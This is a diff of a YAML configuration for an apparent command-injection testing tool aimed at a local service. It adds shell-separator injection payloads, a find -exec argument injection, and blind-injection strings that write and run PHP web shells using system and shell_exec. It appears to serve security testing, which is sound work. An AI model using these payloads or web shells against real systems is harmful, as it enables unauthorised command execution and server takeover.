@@ -1,17 +1,21 @@
 !!map
 variables:
   !!map
+  # Test string to look for in response text
   user_name: !!str szymon_ubuntu
+  # Name of the command to recieve user_name. 
+  command: !!str whoami
   folder_to_watch: !!str /etc/passwd
-  # query_params: !!seq [host, input, name ]
+  # Atackt types are hardcoded, but query params can be changed
   query_params:
     !!map
     ping: host 
     find: input 
     echo : name
     exec : input
-  command: !!str whoami
   base_url: !!str http://localhost:9000/
+
+  # For now only cmd_i, arg_i, blind_cmd_i, and xss are available 
 command_injection:
   !!map
   exec:
@@ -27,21 +31,21 @@ command_injection:
     attack_03: !!str localhost&${ variables.command };
     attack_04: !!str localhost&${ variables.command }
     attack_05: !!str localhost&&${ variables.command };
-    # attack_06: !!str localhost&&${ variables.command }
-    # attack_07: !!str localhost|${ variables.command };
-    # attack_08: !!str localhost|${ variables.command }
-    # attack_09: !!str localhost||${ variables.command };
-    # attack_10: !!str localhost||${ variables.command }
-    # attack_11: !!str localhost0x0a${ variables.command };
-    # attack_12: !!str localhost0x0${ variables.command }
-    # attack_13: !!str localhost;$(${ variables.command });
-    # attack_14: !!str localhost;$(${ variables.command })
-    # attack_15: !!str localhost`${ variables.command }`;
-    # attack_16: !!str localhost`${ variables.command }`
-    # attack_17: !!str localhost<(${ variables.command });
-    # attack_18: !!str localhost<(${ variables.command })
-    # attack_19: !!str localhost<<EOF\n${ variables.command }\nEOF;
-    # attack_20: !!str localhost<<EOF\n${ variables.command }\nEOF
+    attack_06: !!str localhost&&${ variables.command }
+    attack_07: !!str localhost|${ variables.command };
+    attack_08: !!str localhost|${ variables.command }
+    attack_09: !!str localhost||${ variables.command };
+    attack_10: !!str localhost||${ variables.command }
+    attack_11: !!str localhost0x0a${ variables.command };
+    attack_12: !!str localhost0x0${ variables.command }
+    attack_13: !!str localhost;$(${ variables.command });
+    attack_14: !!str localhost;$(${ variables.command })
+    attack_15: !!str localhost`${ variables.command }`;
+    attack_16: !!str localhost`${ variables.command }`
+    attack_17: !!str localhost<(${ variables.command });
+    attack_18: !!str localhost<(${ variables.command })
+    attack_19: !!str localhost<<EOF\n${ variables.command }\nEOF;
+    attack_20: !!str localhost<<EOF\n${ variables.command }\nEOF
   echo:
     !!map
     attack_01: !!str $(${ variables.command })
@@ -55,7 +59,7 @@ argument_injection:
     d_escape_semicolon: !!str . -exec ${ variables.command } \\\\;
   ping:
     !!map
-    inline_echo: !!str $(echo localhost`whoami`)
+    inline_echo: !!str $(echo localhost`${ variables.command }`)
 blind_command_injection:
   !!map
   find:
@@ -63,10 +67,18 @@ blind_command_injection:
     webshell_01: !!str r -exec echo '<?php system(\$_GET['cmd']);' > 01_webshell.php ;
   ping:
     !!map
-    webshell_02: !!str  localhost; echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 02_webshell.php ; php 02_webshell.php whoami ; rm ./02_webshell.php
-    webshell_03: !!str  localhost & echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 03_webshell.php & php 03_webshell.php whoami & rm ./03_webshell.php
-    webshell_04: !!str  localhost && echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 04_webshell.php && php 04_webshell.php whoami && rm ./04_webshell.php
-    webshell_05: !!str  localhost | echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 05_webshell.php | php 05_webshell.php whoami | rm ./05_webshell.php
+    webshell_02: !!str  localhost; echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 02_webshell.php ; php 02_webshell.php ${ variables.command } ; rm ./02_webshell.php
+    webshell_03: !!str  localhost & echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 03_webshell.php & php 03_webshell.php ${ variables.command } & rm ./03_webshell.php
+    webshell_04: !!str  localhost && echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 04_webshell.php && php 04_webshell.php ${ variables.command } && rm ./04_webshell.php
+    webshell_05: !!str  localhost | echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 05_webshell.php | php 05_webshell.php ${ variables.command } | rm ./05_webshell.php
+  exec:
+    !!map
+    webshell_01: !!str  . ; echo '<?php echo shell_exec("${ variables.command }");?>' > 01_webshell_exec.php ; php 01_webshell_exec.php
+    webshell_02: !!str  . ; echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 02_webshell_exec.php ; php 02_webshell_exec.php ${ variables.command }
+    webshell_exec_03: !!str  .  & echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 03_webshell_exec.php & php 03_webshell_exec.php ${ variables.command }
+    webshell_exec_04: !!str  .  && echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 04_webshell_exec.php && php 04_webshell_exec.php ${ variables.command } 
+    webshell_exec_05: !!str  .  | echo '<?php $command = $argv[1]; $output = shell_exec($command); echo $output;?>' > 05_webshell_exec.php | php 05_webshell_exec.php ${ variables.command }
+
 xss:
   !!map
   find:
